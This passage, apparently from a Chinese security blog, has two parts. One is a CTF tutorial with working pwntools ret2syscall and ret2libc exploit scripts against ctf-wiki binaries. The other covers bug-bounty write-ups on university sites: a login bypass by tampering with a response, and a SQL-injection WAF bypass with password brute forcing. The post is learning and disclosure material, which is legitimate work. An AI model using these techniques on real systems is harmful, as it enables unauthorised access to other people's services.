-可以发现在找<code>pop ebx</code>的过程中发现这个地址同时包含控制 ecx、edx 的操作，所以我们选取地址<code>0x0806eb90</code>进行使用<br>
-接着寻找<code>/bin/sh</code>的地址了</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --string &#39;&#x2F;bin&#x2F;sh&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/8%245%40TQI8%60%28%60E%5BL%5DN1D03%246H.png" alt=""><br>
-地址为<code>0x080be408</code>，最后只剩下<code>int 80h</code>的地址了</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#39;int&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/%7BXSEDSULQ%5D8AICT701B0XVY.png" alt=""><br>
-地址为<code>0x08049421</code>，地址都找齐了，就可以开始写exp了</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">bin_sh = <span class="number">0x080be408</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line"><span class="comment">#这里需要按照pop_edx_ecx_ebx的操作顺序来写，所以bin_sh在两个0后面</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(pop_eax_ret) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh) + p32(int_80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>运行后成功获得shell<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/1%5DS3L3IFJ4%5DZST2%5DPW%7D%280%40L.png" alt=""></p>
-<h3 id="ret2libc"><a class="header-anchor" href="#ret2libc">¶</a>ret2libc</h3>
-<p>ret2libc 简单来说就是使我们的 ret 不跳转到 vuln 或者 shellcode 上，而是跳转到了某个函数的 plt 或者该函数对应的 got 表内容，从而控制函数去执行 libc 中的函数，一般情况下使用<code>system(&quot;/bin/sh&quot;)</code><br>
-在 wiki 中，一共给了三道题，分别对应不同情况</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、有system 有&#x2F;bin&#x2F;sh</span><br><span class="line">2、有system 无&#x2F;bin&#x2F;sh</span><br><span class="line">3、无system 无&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
-<h4 id="有system-有-bin-sh"><a class="header-anchor" href="#有system-有-bin-sh">¶</a>有system 有/bin/sh</h4>
-<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a><br>
-首先检查文件<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/1/9HRBC9%25YE%7D8Q17J%60C2LX%25%29I.png" alt=""><br>
-32位程序，并且开启了 NX 保护，用 ida 查看</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>典型的栈溢出，看到有 system 函数<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/1/%7D%29DP%40%5B%25%29AXFZ%7B%28%40U%2839%5DS%40Y.png" alt=""><br>
-地址为<code>0x08048460</code>，接着查找 /bin/sh 的地址</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ret2libc1 --string &#39;&#x2F;bin&#x2F;sh&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/1/J_9Y7HZ%28M%7B6AFHV%7BT%40RSZQ0.png" alt=""><br>
-地址为<code>0x08048720</code>，然后找偏移大小<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/1/CZ%4083DE_V8BFQQ_RJF%5B%25P_J.png" alt=""><br>
-大小为112，可以写exp了</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line">system_a = <span class="number">0x08048460</span></span><br><span class="line">bin_sh_a = <span class="number">0x08048720</span></span><br><span class="line"><span class="comment">#因为是调用system函数，所以需要给一个返回地址，我们随意写一个虚假的地址即可</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(system_a) + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(bin_sh_a)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>运行后获取shell<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/1/G%29KM4E5G%29%7B9O132DF7DLB7Y.png" alt=""></p>
-<h4 id="有system-无-bin-sh"><a class="header-anchor" href="#有system-无-bin-sh">¶</a>有system 无/bin/sh</h4>
-<p>这次在ida中查看，发现没有 /bin/sh 字符串，但是 main 中有 gets</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What do you think ?&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>并且 plt 端中也有gets 函数<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/2/~Y%5DSUM%5BY%40%7D50HU4%603JVVH9E.png" alt=""><br>
-所以思路就是，如果 bss 段可写，我们就通过 gets 接收我们输入的<code>/bin/sh</code>字符串，然后写入到 bss 段中，接着跳转到 system 函数中执行，整个流程图如图所示<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/2/9V22.png" alt=""><br>
-我们先去看一下 bss 段地址<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/2/42Q0A_2MJ8G%291NT9UMS%28C2H.png" alt=""><br>
-为<code>0x0804A080</code>，我们用 gdb 查看一下是否具有可写的权限<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/2/48T%29MSPIXSFJP%7B%7BA0NW_%284X.png" alt=""><br>
-可以看到该区间是具有可写的权限，栈空间由之前的办法求得为112，所以可以写exp了</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">get_addr = <span class="number">0x08048460</span></span><br><span class="line">sys_addr = <span class="number">0x08048490</span></span><br><span class="line">bss_addr = <span class="number">0x0804A080</span></span><br><span class="line"><span class="comment">#因为/bin/sh是写到bss段中，所以地址一样</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(get_addr) + p32(sys_addr) + p32(bss_addr) + p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>运行后成功获取shell<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/2/%603A2M3A9NZM%28RDF2%7DCQT%245U.png" alt=""></p>
-<h4 id="无system-无-bin-sh"><a class="header-anchor" href="#无system-无-bin-sh">¶</a>无system 无/bin/sh</h4>
-<p>在前面的基础上，再次将 system 函数地址去掉，所以这次我们需要同时找到 system 和 /bin/sh<br>
-点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a><br>
-首先检查文件<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/3/DI%60H%2979%251TX%25ET9HB%5DIKPAQ.png" alt=""><br>
-依然开启了 NX 堆栈不可执行保护，放进 ida 中查看源码</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No surprise anymore, system disappeard QQ.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Can you find it !?&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>还是典型的 gets 栈溢出漏洞，没有 system 和 /bin/sh ，我们可以使用 libc 中的 system 和 /bin/sh。如果我们知道了 libc 中的某一个函数地址就可以确定该程序使用的libc版本，从而知道其他函数的地址。</p>
-<blockquote>
-<p>获得libc的某个函数地址通常使用 got 表泄露的方式（即输出某个函数对应的got表项内容），但是由于 libc 的延迟绑定，我们需要泄露的是已经执行过的函数地址</p>
-</blockquote>
-<p>在 main 函数中我们可以看到执行了 puts，所以我们思路如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.先通过一次栈溢出，将puts的plt地址放到返回处，通过代码中的puts(输出)功能泄露出执行过的函数(puts)的got地址</span><br><span class="line"></span><br><span class="line">2.将puts的返回地址设置为_start函数（我们在ida中看到的main()函数是用户代码的入口，是对于用户而言），而start函数是系统代码入口，是程序最初被执行的地方，也就是程序真正的入口），以用来执行system(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line"></span><br><span class="line">3.通过泄露出的got地址计算出libc中的system和&#x2F;bin&#x2F;sh的地址</span><br><span class="line"></span><br><span class="line">4.再次执行栈溢出，把返回地址换成system的地址达到getshell</span><br></pre></td></tr></table></figure>
-<p>编写exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line"><span class="comment">#从程序中获取puts的plt和got以及_start地址</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"><span class="comment">#第一次栈溢出，puts函数输出puts_got，即got的地址</span></span><br><span class="line">payload_1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>,payload_1)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#使用题目的libc</span></span><br><span class="line">libc = elf.libc</span><br><span class="line">libcbase = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#第二次栈溢出，执行system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload_2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(system_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>, payload_2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>执行后成功 getshell<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/3/OC%5B_OJ%5D_%7DX%5DFJ%5BL%5D%7B0PB%6094.png" alt=""></p>
-<p>上面说的都是32位程序，而在64位程序中函数的调用栈是不同的，这也是我们写 payload 时需要注意的地方</p>
-<blockquote>
-<ul>
-<li>32位程序
-<ul>
-<li><strong>函数参数</strong> 在 <strong>函数返回地址</strong> 的上方</li>
-</ul>
-</li>
-<li>64位程序
-<ul>
-<li>采用寄存器传参，所以我们需要覆盖寄存器</li>
-<li>前六个参数按顺序存储在寄存器 rdi, rsi, rdx, rcx, r8, r9 中，参数超过六个时，从第七个开始压入栈中</li>
-<li>内存地址不能大于 0x00007FFFFFFFFFFF， <strong>6 个字节长度</strong> ，否则会抛出异常。</li>
-</ul>
-</li>
-</ul>
-</blockquote>
-<h2 id="结语"><a class="header-anchor" href="#结语">¶</a>结语</h2>
-<p>继续努力学习，后面遇见新的知识点会继续补充这篇文章</p>
-<blockquote>
-<p>参考链接：<br>
-<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/</a><br>
-<a href="https://www.yuque.com/hxfqg9/bin/ug9gx5">https://www.yuque.com/hxfqg9/bin/ug9gx5</a></p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>src漏洞挖掘实战</title>
-    <url>/posts/24632/</url>
-    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
-<p>好久没更新博客了，消失了快两个礼拜，去尝试摸了一下edusrc。本来打算弄个证书，但好像证书站简单的漏洞都被大师傅们给挖没了，一直出不来洞，QAQ…开篇文章打算慢慢记一下一些有趣的实战（文中所有提到的漏洞已提交给edusrc平台），整个过程需要脱敏，所以马赛克是避免不了的，大家将就看看啦~</p>
-<h2 id="实战"><a class="header-anchor" href="#实战">¶</a>实战</h2>
-<h3 id="登录逻辑漏洞"><a class="header-anchor" href="#登录逻辑漏洞">¶</a>登录逻辑漏洞</h3>
-<p>开始了开始了，逛了逛发现一个后台，尝试弱口令登录，admin/123456一套怼上去<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/1.png" alt=""><br>
-坑爹的是发现居然点击登录框没有反应，没有响应对应的请求，右键源码查看一下登录框这里的代码<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/2.png" alt=""><br>
-好家伙，居然只是披着一层登录按钮的皮<br>
-<a href="https://imgtu.com/i/6vxGkD"><img src="https://z3.ax1x.com/2021/03/26/6vxGkD.gif" alt="6vxGkD.gif"></a></p>
-<p>继续翻看源码，看见登录处理的逻辑，并且发现逻辑校验登录成功后会跳转到<code>main.php</code><br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/3.png" alt=""><br>
-心中一喜，可能有戏，直接url换成<code>main.php</code>访问<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/4.png" alt=""><br>
-但进去后，马上弹了一个框又给我踢了出来<br>
-<a href="https://imgtu.com/i/6xSOw6"><img src="https://z3.ax1x.com/2021/03/26/6xSOw6.jpg" alt="6xSOw6.jpg"></a><br>
-我们抓包看看，猜测应该有个文件是校验登录的<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/5.png" alt=""><br>
-抓包<code>main.php</code>，放包后，果然看见了一个<code>session.php</code>，这应该是校验登录结果的文件，我们右键抓一个<code>session.php</code>的返回包<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/6.png" alt=""><br>
-看见了返回的登录结果，解码一下是刚刚弹的框的文字<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/7.png" alt=""><br>
-见证奇迹的时候到了，我们把后面的errMsg给删除，然后把false改成true，这波我单走一个true给你<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/8.png" alt=""><br>
-接着我们放包，成功进来了后台<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/9.png" alt=""><br>
-<a href="https://imgtu.com/i/6xSAG4"><img src="https://z3.ax1x.com/2021/03/26/6xSAG4.jpg" alt="6xSAG4.jpg"></a></p>
-<p>告辞，水完一篇了~</p>
-<h3 id="随笔"><a class="header-anchor" href="#随笔">¶</a>随笔</h3>
-<p>2021年3月11号开始，笔者第一次接触src漏洞挖掘，下面贴图的是第一个漏洞通过审核收到的邮件<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%94/O5P%5BCHZ0M1%24%7D%7D6XZ7R%403LBJ.png" alt=""><br>
-接下来，就是磕磕绊绊的尝试挖掘更多的站点，在4月份4号的时候终于成功拿到了属于自己的证书，完成了自己定的一个月内拿到证书的目标，很开心。<br>
-有证书的学校站点开了这么久，被一个又一个大师傅光顾了这么多次并且提交了大量漏洞，能再找到洞对我来说实属不易，过程坎坎坷坷，但终于还是完成了目标，现在心情好了起来，继续更新嘿嘿！<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%40%5B%60%7BFZQHOQ6EI%5BY95%60AJT%25F.png" alt=""></p>
-<h3 id="可惜的sql注入漏洞"><a class="header-anchor" href="#可惜的sql注入漏洞">¶</a>可惜的sql注入漏洞</h3>
-<p>还是逛逛又到了一个后台，熟悉的一套弱口令打上去，失败了</p>
-<p><a href="https://imgtu.com/i/c8IEmn"><img src="https://z3.ax1x.com/2021/04/07/c8IEmn.gif" alt="c8IEmn.gif"></a></p>
-<p>随手再测一个单引号<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/2PC%7D%29LWZ2EE5VW72CJ%28%60KFS.png" alt=""><br>
-好兄弟，出奇迹了<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/U15%7BMVI%5D%5DDQ6C%24_Z%284BIX_0.png" alt=""><br>
-这百分之99.9存在sql注入啊<br>
-<a href="https://imgtu.com/i/c8O5TJ"><img src="https://z3.ax1x.com/2021/04/07/c8O5TJ.gif" alt="c8O5TJ.gif"></a><br>
-嘿嘿，尝试一波万能密码登录<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/A968%25S4%7DL%7B~0I2X%249T%29P2RM.png" alt=""><br>
-<a href="https://imgtu.com/i/c8X8nU"><img src="https://z3.ax1x.com/2021/04/07/c8X8nU.jpg" alt="c8X8nU.jpg"></a><br>
-有waf，看起来是老版本的D盾，fuzz一下<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/2S8_O%24V%5DXZFELN7%7DCEFIGRB.png" alt=""><br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/%5B6%5B4FBGB%28LXA5T8SEF%29%251YH.png" alt=""><br>
-结果是把<code>=</code>和<code>-</code>都给ban了，总结了一下信息</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网站数据库为sqlserver</span><br><span class="line">fuzz出sql语句应该是</span><br><span class="line">select * from user where user&#x3D;&#39;&#39; and and User_role&#x3D;&#39;管理员&#39; and passwd&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure>
-<p>在网上找了一些姿势都没利用成功，无奈只好闭合语句尝试fuzz一波密码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;号被waf拦截的话用like替代</span><br><span class="line">语句也就是&#39;or&#39;1&#39;like&#39;1</span><br><span class="line"></span><br><span class="line">放到sql语句里就是select * from user where user&#x3D;&#39;&#39;or&#39;1&#39;like&#39;1&#39; and and User_role&#x3D;&#39;管理员&#39; and passwd&#x3D;&#39;&#39;</span><br><span class="line"></span><br><span class="line">接着跑密码字典</span><br></pre></td></tr></table></figure>
-<p>没想到，密码123就登录成功了，嘿嘿，看来网站数据库里有用户密码是123<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/35b9af4c7fc405e94804e34b80cfde62_adc840d6-c7e5-42b6-846d-18212af3e7d2-ITL7TzPR.png" alt=""><br>
-但可惜的是，在审核期间，网站就被学校管理员关站了，导致审核不通过；但总归还是好的，又成功减少了一个网络危害</p>
-<h3 id="随笔2"><a class="header-anchor" href="#随笔2">¶</a>随笔2</h3>
-<p>最近很忙，以至于博客很久也没有来更新，今天省hw结束了，随即打算更新一下文章；思绪从哪里开始讲起呢？从3月份中旬开始学习漏洞挖掘开始吧，一开始其实没有打算先接触src漏洞挖掘，因为觉得自己还需要更多知识来沉淀自己，但为了在4月底的省hw拿个好名次，也就不得不开始去学习一下，好在结果还算满意，最后离结束只剩几个小时的时候用三个0day埋伏了一手，稳稳拿下了省hw高校第一；想起这一个月的学习，还是蛮惊讶的，发现自己在一个月的时间陆陆续续获得了上海交通大学、同济大学、兰州大学、南开大学、东北林业大学、常熟理工、上海外国语等学校颁发的漏洞证书，下面贴几张已经收到的图片吧<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/IMG20210924232613.jpg" alt=""><br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/IMG_20210414_114939.jpg" alt=""><br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/qq_pic_merged_1619838122349.jpg" alt=""></p>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/qq_pic_merged_1619838030290.jpg" alt=""></p>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/qq_pic_merged_1619837999884.jpg" alt=""></p>
-<p>到底还是最后逼了自己一把，还是那句话，有付出才会有收获；后面估计很长一段时间不会再进行src的漏洞挖掘了，打算把精力转向基础知识的学习</p>
-<h3 id="逻辑漏洞-垂直越权"><a class="header-anchor" href="#逻辑漏洞-垂直越权">¶</a>逻辑漏洞-垂直越权</h3>
-<p>这个洞纯属偶然，在刷手机的时候，无意发现的学校的网址，用电脑访问了之后是一个登录页面<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/%60JOP7W%7D%29%5B7%40E_%24U6D0LG~G6.png" alt="">可以注册，注册了一个账号<br>
-账号：3150103968<br>
-密码：12345678<br>
-然后登陆，进去是普通的用户权限<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/JQFF554I%5BK%40VMAB1VMC_%60SC.png" alt=""><br>
-然后退出登录，回到登录框这里，用burpsuite抓取登录的数据包<br>
